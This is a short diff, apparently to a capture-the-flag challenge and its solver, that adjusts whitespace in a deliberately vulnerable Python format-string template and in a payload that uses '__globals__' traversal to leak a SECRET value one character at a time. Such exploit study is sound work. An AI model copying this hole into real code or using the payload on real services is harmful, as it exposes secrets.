@@ -26,7 +26,7 @@ class Sandbox:
             self.ask_age()
             to_format = f"""
 Printing a {self.width}-character wide box:
-[Age: {{self.age:{self.width}}} ]"""
+[Age: {{ self.age:{self.width }}} ]"""
             print(to_format.format(self=self))
             self.ask_secret()
 
@@ -76,7 +76,7 @@ while True:
         stderr=subprocess.STDOUT
     )
 
-    payload = f"{{self.ask_age.__globals__[SECRET][{i}]}}\n"
+    payload = f"{{ self.ask_age.__globals__[SECRET][{i}] }}\n"
     inp = b"1\n" + payload.encode()
     out, _ = p.communicate(inp)
 
